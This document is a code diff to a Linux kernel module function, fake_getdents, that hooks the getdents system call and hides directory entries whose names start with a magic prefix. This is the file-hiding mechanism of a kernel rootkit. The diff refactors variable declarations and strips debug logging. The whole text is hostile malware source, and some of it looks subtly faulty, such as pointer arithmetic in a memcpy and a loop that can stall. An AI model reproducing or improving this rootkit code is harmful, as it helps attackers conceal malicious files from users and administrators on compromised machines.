@@ -29,12 +29,17 @@ asmlinkage long (*real_getdents)(struct pt_regs *);
 
 asmlinkage long fake_getdents(struct pt_regs *regs) {
   int i, j;
-  unsigned short last_d_reclen;
-  long bytes_read;
   unsigned char *buffer;
+  unsigned char *buffer_dirent_kernel;
+  unsigned char *buffer_next_dirent_kernel;
+  unsigned short d_reclen;
+  unsigned short last_d_reclen;
+  unsigned short next_d_reclen;
+  long bytes_read;
   struct linux_dirent __user *dirent_user;
   struct linux_dirent *dirent_kernel;
   struct linux_dirent *last_dirent_kernel;
+  struct linux_dirent *next_dirent_kernel;
 
   bytes_read = (*real_getdents)(regs);
   dirent_user = (struct linux_dirent __user *)regs->si;
@@ -43,6 +48,7 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
     printk(KERN_INFO "failed to kmalloc buffer");
     return bytes_read;
   }
+  
   if(copy_from_user(buffer, (unsigned char *)dirent_user, bytes_read)) {
     printk(KERN_INFO "failed to copy_from_user dirent");
     kfree(buffer);
@@ -52,37 +58,36 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
   i = 0;
   last_d_reclen = 0;
   dirent_kernel = (struct linux_dirent *)buffer;
+  
   while (i < bytes_read) {
     j = 0;
+    d_reclen = dirent_kernel->d_reclen;
+    
     while (j < MAGIC_PREFIX_LEN && dirent_kernel->d_name[j] != '\0' && dirent_kernel->d_name[j] == MAGIC_PREFIX[j])
       j++;
 
     if (j == MAGIC_PREFIX_LEN) {
-      printk(KERN_INFO "magic prefix found : %s", dirent_kernel->d_name);
-      printk(KERN_INFO "d_reclen + %u", last_d_reclen);
-
       if (last_d_reclen == 0) {
-	struct linux_dirent *next_dirent_kernel = (struct linux_dirent *)(buffer + i + dirent_kernel->d_reclen);
-	unsigned short dirent_kernel_len = dirent_kernel->d_reclen;
-	unsigned short next_dirent_kernel_len = next_dirent_kernel->d_reclen;
-	unsigned char *buffer_dirent_kernel = kmalloc(dirent_kernel_len, GFP_KERNEL);
+	next_dirent_kernel = (struct linux_dirent *)(buffer + i + d_reclen);
+	next_d_reclen = next_dirent_kernel->d_reclen;
+	buffer_dirent_kernel = kmalloc(d_reclen, GFP_KERNEL);
 	if (!buffer_dirent_kernel) {
 	  printk(KERN_INFO "failed to kmalloc buffer_dirent_kernel");
 	  continue;
 	}
 
-	unsigned char *buffer_next_dirent_kernel = kmalloc(next_dirent_kernel_len, GFP_KERNEL);
+	buffer_next_dirent_kernel = kmalloc(next_d_reclen, GFP_KERNEL);
 	if (!buffer_next_dirent_kernel) {
 	  printk(KERN_INFO "failed to kmalloc buffer_next_dirent_kernel");
 	  kfree(buffer_dirent_kernel);
 	  continue;
 	}
 	
-	memcpy(buffer_dirent_kernel, dirent_kernel, dirent_kernel_len);
-	memcpy(buffer_next_dirent_kernel, next_dirent_kernel, next_dirent_kernel_len);
+	memcpy(buffer_dirent_kernel, dirent_kernel, d_reclen);
+	memcpy(buffer_next_dirent_kernel, next_dirent_kernel, next_d_reclen);
 
-	memcpy(dirent_kernel, buffer_next_dirent_kernel, next_dirent_kernel_len);
-	memcpy(dirent_kernel + next_dirent_kernel_len, buffer_dirent_kernel, dirent_kernel_len);
+	memcpy(dirent_kernel, buffer_next_dirent_kernel, next_d_reclen);
+	memcpy(dirent_kernel + next_d_reclen, buffer_dirent_kernel, d_reclen);
 
 	kfree(buffer_dirent_kernel);
 	kfree(buffer_next_dirent_kernel);
@@ -93,8 +98,8 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
       }
     }
 
-    last_d_reclen = dirent_kernel->d_reclen;
-    i += dirent_kernel->d_reclen;
+    last_d_reclen = d_reclen;
+    i += d_reclen;
     dirent_kernel = (struct linux_dirent *)(buffer + i);
   }
 
